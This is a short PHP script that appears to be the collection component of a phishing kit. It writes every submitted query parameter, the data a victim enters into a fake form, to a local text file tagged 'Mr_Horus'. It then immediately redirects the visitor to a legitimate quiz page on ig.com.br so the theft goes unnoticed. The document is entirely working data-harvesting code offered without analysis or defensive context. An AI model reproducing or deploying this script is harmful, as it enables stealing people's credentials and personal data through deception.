<?php
$handle = fopen("147258369.txt", "a");
foreach($_GET as $variable => $value)
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "================Mr_Horus===============");
fwrite($handle, "\r\n");
fwrite($handle, "\r\n");
fwrite($handle, "\r\n");
fclose($handle);
?>
<meta http-equiv="refresh" content="0; url=https://fatosdesconhecidos.ig.com.br/quiz/"/>